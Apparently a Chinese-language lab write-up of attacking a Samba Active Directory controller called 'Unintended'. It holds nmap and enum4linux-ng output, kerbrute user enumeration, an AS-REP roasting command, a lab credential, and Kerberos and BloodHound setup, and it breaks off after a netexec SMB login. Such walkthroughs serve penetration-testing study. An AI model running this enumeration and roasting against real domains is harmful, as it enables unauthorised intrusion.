49153/tcp open  msrpc        syn-ack ttl 63 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 63 Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.98%I=7%D=3/22%Time=69BF99C1%P=x86_64-pc-linux-gnu%r(DNSS
SF:tatusRequestTCP,E,"\0\x0c\0\0\x90\x04\0\0\0\0\0\0\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port88-TCP:V=7.98%I=7%D=3/22%Time=69BF99BC%P=x86_64-pc-linux-gnu%r(Kerb
SF:eros,68,"\0\0\0d~b0`\xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e\xa4\x11\x1
SF:8\x0f20260322072648Z\xa5\x05\x02\x03\x07\nF\xa6\x03\x02\x01\x06\xa9\x04
SF:\x1b\x02NM\xaa\x170\x15\xa0\x03\x02\x01\0\xa1\x0e0\x0c\x1b\x06krbtgt\x1
SF:b\x02NM\xab\x16\x1b\x14No\x20client\x20in\x20request");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=3/22%OT=22%CT=%CU=40884%PV=Y%DS=2%DC=T%G=N%TM=69BF9A13
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11
OS:NW7%O6=M542ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 9.185 days (since Fri Mar 13 11:02:25 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 12262/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 19478/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 43681/udp): CLEAN (Failed to receive data)
|   Check 4 (port 38096/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-03-22T07:28:03
|_  start_date: N/A
| nbstat: NetBIOS name: __SAMBA__, NetBIOS user: DC, NetBIOS MAC: b0:4a:18:0b:f3:7f (unknown)
| Names:
|   DC<03>               Flags: <unique><active>
|   UNINTENDED<1b>       Flags: <unique><active>
|   UNINTENDED<1c>       Flags: <group><active>
|   UNINTENDED<00>       Flags: <group><active>
|   __SAMBA__<00>        Flags: <group><active><permanent>
|   __SAMBA__<20>        Flags: <group><active><permanent>
| Statistics:
|   b0 4a 18 0b f3 7f 00 00 98 c0 b7 53 55 76 00 00 ab
|   ab d7 0b 18 00 00 7f f3 0b 18 95 78 7f f3 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 0s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   494.73 ms 10.10.16.1
2   223.74 ms 10.13.38.57
```

## 添加hosts
```plain
echo "10.13.38.57 DC.unintended.vl unintended.vl" >> /etc/hosts
```

# 10.13.38.57
## Startpoint
### enum4linux
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# enum4linux-ng -A 10.13.38.57
ENUM4LINUX - next generation (v1.3.10)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.13.38.57
[*] Username ......... ''
[*] Random Username .. 'glbqoekr'
[*] Password ......... ''
[*] Timeout .......... 10 second(s)

 ====================================
|    Listener Scan on 10.13.38.57    |
 ====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ===================================================
|    Domain Information via LDAP for 10.13.38.57    |
 ===================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: unintended.vl

 ==========================================================
|    NetBIOS Names and Workgroup/Domain for 10.13.38.57    |
 ==========================================================
[+] Got domain/workgroup name: UNINTENDED
[+] Full NetBIOS names information:
- DC              <03> -         M <ACTIVE>  Messenger Service                                          
- UNINTENDED      <1b> -         M <ACTIVE>  Domain Master Browser                                      
- UNINTENDED      <1c> - <GROUP> M <ACTIVE>  Domain Controllers                                         
- UNINTENDED      <00> - <GROUP> M <ACTIVE>  Domain/Workgroup Name                                      
- __SAMBA__       <00> - <GROUP> M <ACTIVE> <PERMANENT>  Domain/Workgroup Name                          
- MAC Address = B0-4A-18-0B-F3-7F                                                                       

 ========================================
|    SMB Dialect Check on 10.13.38.57    |
 ========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                     
  SMB 1.0: false                                                                                        
  SMB 2.0.2: true                                                                                       
  SMB 2.1: true                                                                                         
  SMB 3.0: true                                                                                         
  SMB 3.1.1: true                                                                                       
Preferred dialect: SMB 3.0                                                                              
SMB1 only: false                                                                                        
SMB signing required: true                                                                              

 ==========================================================
|    Domain Information via SMB session for 10.13.38.57    |
 ==========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC                                                                               
NetBIOS domain name: UNINTENDED                                                                         
DNS domain: unintended.vl                                                                               
FQDN: dc.unintended.vl                                                                                  
Derived membership: domain member                                                                       
Derived domain: UNINTENDED                                                                              

 ========================================
|    RPC Session Check on 10.13.38.57    |
 ========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE

 ==================================================
|    Domain Information via RPC for 10.13.38.57    |
 ==================================================
[+] Domain: UNINTENDED
[+] Domain SID: S-1-5-21-3500783532-3433670129-339942407
[+] Membership: domain member

 ==============================================
|    OS Information via RPC for 10.13.38.57    |
 ==============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Linux/Unix (Samba 4.15.13-Ubuntu)                                                                   
OS version: '6.1'                                                                                       
OS release: ''                                                                                          
OS build: '0'                                                                                           
Native OS: not supported                                                                                
Native LAN manager: not supported                                                                       
Platform id: '500'                                                                                      
Server type: '0x809a03'                                                                                 
Server type string: Wk Sv PrQ Unx NT SNT Samba 4.15.13-Ubuntu                                           

 ====================================
|    Users via RPC on 10.13.38.57    |
 ====================================
[*] Enumerating users via 'querydispinfo'
[+] Found 6 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 6 user(s) via 'enumdomusers'
[+] After merging user results we have 6 user(s) total:
'1103':                                                                                                 
  username: juan                                                                                        
  name: ''                                                                                              
  acb: '0x00000000'                                                                                     
  description: ''                                                                                       
'1104':                                                                                                 
  username: abbie                                                                                       
  name: ''                                                                                              
  acb: '0x00000000'                                                                                     
  description: ''                                                                                       
'1105':                                                                                                 
  username: cartor                                                                                      
  name: ''                                                                                              
  acb: '0x00000000'                                                                                     
  description: ''                                                                                       
'500':                                                                                                  
  username: Administrator                                                                               
  name: ''                                                                                              
  acb: '0x00000000'                                                                                     
  description: Built-in account for administering the computer/domain                                   
'501':                                                                                                  
  username: Guest                                                                                       
  name: ''                                                                                              
  acb: '0x00000000'                                                                                     
  description: Built-in account for guest access to the computer/domain                                 
'502':                                                                                                  
  username: krbtgt                                                                                      
  name: ''                                                                                              
  acb: '0x00000000'                                                                                     
  description: Key Distribution Center Service Account                                                  

 =====================================
|    Groups via RPC on 10.13.38.57    |
 =====================================
[*] Enumerating local groups
[+] Found 5 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 21 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 12 group(s) via 'enumdomgroups'
[+] After merging groups results we have 38 group(s) total:
'1101':                                                                                                 
  groupname: DnsAdmins                                                                                  
  type: local                                                                                           
'1102':                                                                                                 
  groupname: DnsUpdateProxy                                                                             
  type: domain                                                                                          
'1106':                                                                                                 
  groupname: Web Developers                                                                             
  type: domain                                                                                          
'498':                                                                                                  
  groupname: Enterprise Read-only Domain Controllers                                                    
  type: domain                                                                                          
'512':                                                                                                  
  groupname: Domain Admins                                                                              
  type: domain                                                                                          
'513':                                                                                                  
  groupname: Domain Users                                                                               
  type: domain                                                                                          
'514':                                                                                                  
  groupname: Domain Guests                                                                              
  type: domain                                                                                          
'515':                                                                                                  
  groupname: Domain Computers                                                                           
  type: domain                                                                                          
'516':                                                                                                  
  groupname: Domain Controllers                                                                         
  type: domain                                                                                          
'517':                                                                                                  
  groupname: Cert Publishers                                                                            
  type: local                                                                                           
'518':                                                                                                  
  groupname: Schema Admins                                                                              
  type: domain                                                                                          
'519':                                                                                                  
  groupname: Enterprise Admins                                                                          
  type: domain                                                                                          
'520':                                                                                                  
  groupname: Group Policy Creator Owners                                                                
  type: domain                                                                                          
'521':                                                                                                  
  groupname: Read-only Domain Controllers                                                               
  type: domain                                                                                          
'544':                                                                                                  
  groupname: Administrators                                                                             
  type: builtin                                                                                         
'545':                                                                                                  
  groupname: Users                                                                                      
  type: builtin                                                                                         
'546':                                                                                                  
  groupname: Guests                                                                                     
  type: builtin                                                                                         
'548':                                                                                                  
  groupname: Account Operators                                                                          
  type: builtin                                                                                         
'549':                                                                                                  
  groupname: Server Operators                                                                           
  type: builtin                                                                                         
'550':                                                                                                  
  groupname: Print Operators                                                                            
  type: builtin                                                                                         
'551':                                                                                                  
  groupname: Backup Operators                                                                           
  type: builtin                                                                                         
'552':                                                                                                  
  groupname: Replicator                                                                                 
  type: builtin                                                                                         
'553':                                                                                                  
  groupname: RAS and IAS Servers                                                                        
  type: local                                                                                           
'554':                                                                                                  
  groupname: Pre-Windows 2000 Compatible Access                                                         
  type: builtin                                                                                         
'555':                                                                                                  
  groupname: Remote Desktop Users                                                                       
  type: builtin                                                                                         
'556':                                                                                                  
  groupname: Network Configuration Operators                                                            
  type: builtin                                                                                         
'557':                                                                                                  
  groupname: Incoming Forest Trust Builders                                                             
  type: builtin                                                                                         
'558':                                                                                                  
  groupname: Performance Monitor Users                                                                  
  type: builtin                                                                                         
'559':                                                                                                  
  groupname: Performance Log Users                                                                      
  type: builtin                                                                                         
'560':                                                                                                  
  groupname: Windows Authorization Access Group                                                         
  type: builtin                                                                                         
'561':                                                                                                  
  groupname: Terminal Server License Servers                                                            
  type: builtin                                                                                         
'562':                                                                                                  
  groupname: Distributed COM Users                                                                      
  type: builtin                                                                                         
'568':                                                                                                  
  groupname: IIS_IUSRS                                                                                  
  type: builtin                                                                                         
'569':                                                                                                  
  groupname: Cryptographic Operators                                                                    
  type: builtin                                                                                         
'571':                                                                                                  
  groupname: Allowed RODC Password Replication Group                                                    
  type: local                                                                                           
'572':                                                                                                  
  groupname: Denied RODC Password Replication Group                                                     
  type: local                                                                                           
'573':                                                                                                  
  groupname: Event Log Readers                                                                          
  type: builtin                                                                                         
'574':                                                                                                  
  groupname: Certificate Service DCOM Access                                                            
  type: builtin                                                                                         

 =====================================
|    Shares via RPC on 10.13.38.57    |
 =====================================
[*] Enumerating shares
[+] Found 4 share(s):
IPC$:                                                                                                   
  comment: IPC Service (Samba 4.15.13-Ubuntu)                                                           
  type: IPC                                                                                             
home:                                                                                                   
  comment: Home Directories                                                                             
  type: Disk                                                                                            
netlogon:                                                                                               
  comment: ''                                                                                           
  type: Disk                                                                                            
sysvol:                                                                                                 
  comment: ''                                                                                           
  type: Disk                                                                                            
[*] Testing share IPC$
[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
[*] Testing share home
[+] Mapping: DENIED, Listing: N/A
[*] Testing share netlogon
[+] Mapping: DENIED, Listing: N/A
[*] Testing share sysvol
[+] Mapping: DENIED, Listing: N/A

 ========================================
|    Policies via RPC for 10.13.38.57    |
 ========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:                                                                            
  Password history length: 24                                                                           
  Minimum password length: 7                                                                            
  Minimum password age: 1 day 4 minutes                                                                 
  Maximum password age: 41 days 23 hours 53 minutes                                                     
  Password properties:                                                                                  
  - DOMAIN_PASSWORD_COMPLEX: true                                                                       
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false                                                               
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false                                                              
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false                                                               
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false                                                     
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false                                                       
Domain lockout information:                                                                             
  Lockout observation window: 30 minutes                                                                
  Lockout duration: 30 minutes                                                                          
  Lockout threshold: None                                                                               
Domain logoff information:                                                                              
  Force logoff time: not set                                                                            

 ========================================
|    Printers via RPC for 10.13.38.57    |
 ========================================
[+] No printers returned (this is not an error)

Completed after 82.50 seconds
```

### LDAP 匿名枚举(失败)
> LDAP 匿名查询被禁用
>
> `Operations error - 需要认证` (00002020: Operation unavailable without authentication)
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# ldapsearch -x -H ldap://10.13.38.57 -b DC=unintended,DC=vl              
# extended LDIF
#
# LDAPv3
# base <DC=unintended,DC=vl> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 00002020: Operation unavailable without authentication

# numResponses: 1
```

### SMB匿名登录(失败)
> 匿名登录成功，可列出共享，但连接任何共享均返回 `NT_STATUS_ACCESS_DENIED`
>
> 匿名访问被拒绝
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# smbclient -L //10.13.38.57/ -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        sysvol          Disk      
        netlogon        Disk      
        home            Disk      Home Directories
        IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.13.38.57 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

### kerbrute 枚举用户(失败)
> 常见用户名中没有跑出有效用户，需要先找到真实用户名
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# kerbrute userenum -d unintended.vl --dc 10.13.38.57 /usr/share/seclists/Usernames/Names/familynames-usa-top1000.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/22/26 - Ronnie Flathers @ropnop

2026/03/22 21:11:19 >  Using KDC(s):
2026/03/22 21:11:19 >   10.13.38.57:88

2026/03/22 21:12:19 >  Done! Tested 1000 usernames (0 valid) in 60.598 seconds
```

### AS-REP Roasting(失败)
> 所有常见用户名均返回 `KDC_ERR_C_PRINCIPAL_UNKNOWN`，无法获取有效用户名
>
> 尝试juan abbie cartor亦无收货
>

```plain
impacket-GetNPUsers unintended.vl -dc-ip 10.13.38.57 -no-pass -usersfile /usr/share/seclists/Usernames/Names/familynames-usa-top1000.txt
```

## juan@unintended.local
> 凭据：juan/theJUANman2019
>

### enum4linux
```latex
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# enum4linux-ng -A 10.13.38.57 -u juan -p theJUANman2019                  
ENUM4LINUX - next generation (v1.3.10)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.13.38.57
[*] Username ......... 'juan'
[*] Random Username .. 'wttapbyo'
[*] Password ......... 'theJUANman2019'
[*] Timeout .......... 10 second(s)

 ====================================
|    Listener Scan on 10.13.38.57    |
 ====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ===================================================
|    Domain Information via LDAP for 10.13.38.57    |
 ===================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: unintended.vl

 ==========================================================
|    NetBIOS Names and Workgroup/Domain for 10.13.38.57    |
 ==========================================================
[+] Got domain/workgroup name: UNINTENDED
[+] Full NetBIOS names information:
- DC              <03> -         M <ACTIVE>  Messenger Service                                  
- UNINTENDED      <1b> -         M <ACTIVE>  Domain Master Browser                              
- UNINTENDED      <1c> - <GROUP> M <ACTIVE>  Domain Controllers                                 
- UNINTENDED      <00> - <GROUP> M <ACTIVE>  Domain/Workgroup Name                              
- __SAMBA__       <00> - <GROUP> M <ACTIVE> <PERMANENT>  Domain/Workgroup Name                  
- MAC Address = B0-4A-18-0B-F3-7F                                                               

 ========================================
|    SMB Dialect Check on 10.13.38.57    |
 ========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                             
  SMB 1.0: false                                                                                
  SMB 2.0.2: true                                                                               
  SMB 2.1: true                                                                                 
  SMB 3.0: true                                                                                 
  SMB 3.1.1: true                                                                               
Preferred dialect: SMB 3.0                                                                      
SMB1 only: false                                                                                
SMB signing required: true                                                                      

 ==========================================================
|    Domain Information via SMB session for 10.13.38.57    |
 ==========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC                                                                       
NetBIOS domain name: UNINTENDED                                                                 
DNS domain: unintended.vl                                                                       
FQDN: dc.unintended.vl                                                                          
Derived membership: domain member                                                               
Derived domain: UNINTENDED                                                                      

 ========================================
|    RPC Session Check on 10.13.38.57    |
 ========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for password authentication
[+] Server allows authentication via username 'juan' and password 'theJUANman2019'
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE

 ==================================================
|    Domain Information via RPC for 10.13.38.57    |
 ==================================================
[+] Domain: UNINTENDED
[+] Domain SID: S-1-5-21-3500783532-3433670129-339942407
[+] Membership: domain member

 ==============================================
|    OS Information via RPC for 10.13.38.57    |
 ==============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Linux/Unix (Samba 4.15.13-Ubuntu)                                                           
OS version: '6.1'                                                                               
OS release: ''                                                                                  
OS build: '0'                                                                                   
Native OS: not supported                                                                        
Native LAN manager: not supported                                                               
Platform id: '500'                                                                              
Server type: '0x809a03'                                                                         
Server type string: Wk Sv PrQ Unx NT SNT Samba 4.15.13-Ubuntu                                   

 ====================================
|    Users via RPC on 10.13.38.57    |
 ====================================
[*] Enumerating users via 'querydispinfo'
[+] Found 6 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 6 user(s) via 'enumdomusers'
[+] After merging user results we have 6 user(s) total:
'1103':                                                                                         
  username: juan                                                                                
  name: ''                                                                                      
  acb: '0x00000000'                                                                             
  description: ''                                                                               
'1104':                                                                                         
  username: abbie                                                                               
  name: ''                                                                                      
  acb: '0x00000000'                                                                             
  description: ''                                                                               
'1105':                                                                                         
  username: cartor                                                                              
  name: ''                                                                                      
  acb: '0x00000000'                                                                             
  description: ''                                                                               
'500':                                                                                          
  username: Administrator                                                                       
  name: ''                                                                                      
  acb: '0x00000000'                                                                             
  description: Built-in account for administering the computer/domain                           
'501':                                                                                          
  username: Guest                                                                               
  name: ''                                                                                      
  acb: '0x00000000'                                                                             
  description: Built-in account for guest access to the computer/domain                         
'502':                                                                                          
  username: krbtgt                                                                              
  name: ''                                                                                      
  acb: '0x00000000'                                                                             
  description: Key Distribution Center Service Account                                          

 =====================================
|    Groups via RPC on 10.13.38.57    |
 =====================================
[*] Enumerating local groups
[+] Found 5 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 21 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 12 group(s) via 'enumdomgroups'
[+] After merging groups results we have 38 group(s) total:
'1101':                                                                                         
  groupname: DnsAdmins                                                                          
  type: local                                                                                   
'1102':                                                                                         
  groupname: DnsUpdateProxy                                                                     
  type: domain                                                                                  
'1106':                                                                                         
  groupname: Web Developers                                                                     
  type: domain                                                                                  
'498':                                                                                          
  groupname: Enterprise Read-only Domain Controllers                                            
  type: domain                                                                                  
'512':                                                                                          
  groupname: Domain Admins                                                                      
  type: domain                                                                                  
'513':                                                                                          
  groupname: Domain Users                                                                       
  type: domain                                                                                  
'514':                                                                                          
  groupname: Domain Guests                                                                      
  type: domain                                                                                  
'515':                                                                                          
  groupname: Domain Computers                                                                   
  type: domain                                                                                  
'516':                                                                                          
  groupname: Domain Controllers                                                                 
  type: domain                                                                                  
'517':                                                                                          
  groupname: Cert Publishers                                                                    
  type: local                                                                                   
'518':                                                                                          
  groupname: Schema Admins                                                                      
  type: domain                                                                                  
'519':                                                                                          
  groupname: Enterprise Admins                                                                  
  type: domain                                                                                  
'520':                                                                                          
  groupname: Group Policy Creator Owners                                                        
  type: domain                                                                                  
'521':                                                                                          
  groupname: Read-only Domain Controllers                                                       
  type: domain                                                                                  
'544':                                                                                          
  groupname: Administrators                                                                     
  type: builtin                                                                                 
'545':                                                                                          
  groupname: Users                                                                              
  type: builtin                                                                                 
'546':                                                                                          
  groupname: Guests                                                                             
  type: builtin                                                                                 
'548':                                                                                          
  groupname: Account Operators                                                                  
  type: builtin                                                                                 
'549':                                                                                          
  groupname: Server Operators                                                                   
  type: builtin                                                                                 
'550':                                                                                          
  groupname: Print Operators                                                                    
  type: builtin                                                                                 
'551':                                                                                          
  groupname: Backup Operators                                                                   
  type: builtin                                                                                 
'552':                                                                                          
  groupname: Replicator                                                                         
  type: builtin                                                                                 
'553':                                                                                          
  groupname: RAS and IAS Servers                                                                
  type: local                                                                                   
'554':                                                                                          
  groupname: Pre-Windows 2000 Compatible Access                                                 
  type: builtin                                                                                 
'555':                                                                                          
  groupname: Remote Desktop Users                                                               
  type: builtin                                                                                 
'556':                                                                                          
  groupname: Network Configuration Operators                                                    
  type: builtin                                                                                 
'557':                                                                                          
  groupname: Incoming Forest Trust Builders                                                     
  type: builtin                                                                                 
'558':                                                                                          
  groupname: Performance Monitor Users                                                          
  type: builtin                                                                                 
'559':                                                                                          
  groupname: Performance Log Users                                                              
  type: builtin                                                                                 
'560':                                                                                          
  groupname: Windows Authorization Access Group                                                 
  type: builtin                                                                                 
'561':                                                                                          
  groupname: Terminal Server License Servers                                                    
  type: builtin                                                                                 
'562':                                                                                          
  groupname: Distributed COM Users                                                              
  type: builtin                                                                                 
'568':                                                                                          
  groupname: IIS_IUSRS                                                                          
  type: builtin                                                                                 
'569':                                                                                          
  groupname: Cryptographic Operators                                                            
  type: builtin                                                                                 
'571':                                                                                          
  groupname: Allowed RODC Password Replication Group                                            
  type: local                                                                                   
'572':                                                                                          
  groupname: Denied RODC Password Replication Group                                             
  type: local                                                                                   
'573':                                                                                          
  groupname: Event Log Readers                                                                  
  type: builtin                                                                                 
'574':                                                                                          
  groupname: Certificate Service DCOM Access                                                    
  type: builtin                                                                                 

 =====================================
|    Shares via RPC on 10.13.38.57    |
 =====================================
[*] Enumerating shares
[+] Found 4 share(s):
IPC$:                                                                                           
  comment: IPC Service (Samba 4.15.13-Ubuntu)                                                   
  type: IPC                                                                                     
home:                                                                                           
  comment: Home Directories                                                                     
  type: Disk                                                                                    
netlogon:                                                                                       
  comment: ''                                                                                   
  type: Disk                                                                                    
sysvol:                                                                                         
  comment: ''                                                                                   
  type: Disk                                                                                    
[*] Testing share IPC$
[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
[*] Testing share home
[+] Mapping: DENIED, Listing: N/A
[*] Testing share netlogon
[+] Mapping: OK, Listing: DENIED
[*] Testing share sysvol
[+] Mapping: OK, Listing: DENIED

 ========================================
|    Policies via RPC for 10.13.38.57    |
 ========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:                                                                    
  Password history length: 24                                                                   
  Minimum password length: 7                                                                    
  Minimum password age: 1 day 4 minutes                                                         
  Maximum password age: 41 days 23 hours 53 minutes                                             
  Password properties:                                                                          
  - DOMAIN_PASSWORD_COMPLEX: true                                                               
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false                                                       
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false                                                      
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false                                                       
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false                                             
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false                                               
Domain lockout information:                                                                     
  Lockout observation window: 30 minutes                                                        
  Lockout duration: 30 minutes                                                                  
  Lockout threshold: None                                                                       
Domain logoff information:                                                                      
  Force logoff time: not set                                                                    

 ========================================
|    Printers via RPC for 10.13.38.57    |
 ========================================
[+] No printers returned (this is not an error)

Completed after 105.71 seconds

```

### 时间同步
> Kerberos 要求误差在 5 分钟内
>

#### ntpdate(失败)
```latex
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/Unintended/blood]
└─# sudo ntpdate 10.13.38.57
ntpdig: no eligible servers
```

#### rdate(失败)
```latex
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/Unintended/blood]
└─# sudo rdate -n 10.13.38.57
rdate: Unable to receive NTP packet from server: Connection refused
rdate: Unable to get a reasonable time estimate
```

#### nmap-script
```latex
┌──(kali㉿kali)-[~/Desktop/htb/Unintended]
└─$ nmap -p 445 --script smb2-time 10.13.38.57
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-22 23:03 +0800
Nmap scan report for DC.unintended.vl (10.13.38.57)
Host is up (0.23s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-time: 
|   date: 2026-03-22T15:03:21
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 2.84 seconds
```

#### 设置时间
```latex
┌──(kali㉿kali)-[~/Desktop/htb/Unintended]
└─$ sudo date --set="2026-03-22 15:03:32"
[sudo] kali 的密码：
2026年 03月 22日 星期日 15:03:32 CST
```

### 获取Kerberos TGT
> Kerberos 认证支持签名，能绕开 Samba 的 LDAP 签名要求
>

#### /etc/krb5.conf
> 告诉系统 KDC在哪
>

```latex
sudo tee /etc/krb5.conf << 'EOF'
[libdefaults]
    default_realm = UNINTENDED.VL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    no_addresses = true
    allow_weak_crypto = true
    default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac
    default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac

[realms]
    UNINTENDED.VL = {
        kdc = 10.13.38.57
        admin_server = 10.13.38.57
    }

[domain_realm]
    .unintended.vl = UNINTENDED.VL
    unintended.vl = UNINTENDED.VL
EOF
```

#### kinit
> 获取 Kerberos 票据授予票据（TGT）
>

```latex
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# kinit juan@UNINTENDED.VL     
Password for juan@UNINTENDED.VL: theJUANman2019
```

### bloodhound-python
> 1. DC 是 Samba AD（之前 NetBIOS 里看到了 __SAMBA__），强制要求 LDAP 签名，而 bloodhound-python  用的 ldap3 库做 NTLM bind 时不带签名，直接被切断
> 2. Kerberos 失败是因为时间不同步，NTLM 又被 LDAP 签名拦截，双重失败
>

#### 失败-ldap签名
```latex
bloodhound-python -u juan -p 'theJUANman2019' -d unintended.vl --dns-tcp -ns 10.13.38.57 -c all --use-ldaps
```

#### 失败-kerberos绕过ldap签名
```latex
bloodhound-python -u juan -p 'theJUANman2019' -d unintended.vl -ns 10.13.38.57 --dns-tcp --use-ldaps -c all
```

### netexec
#### smb
```latex
┌──(kali㉿kali)-[~/Desktop/htb/Unintended]
└─$ netexec smb 10.13.38.57 -u juan -p theJUANman2019 --shares
SMB         10.13.38.57     445    DC               [*] Unix - Samba x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.13.38.57     445    DC               [+] unintended.vl\juan:theJUANman2019 
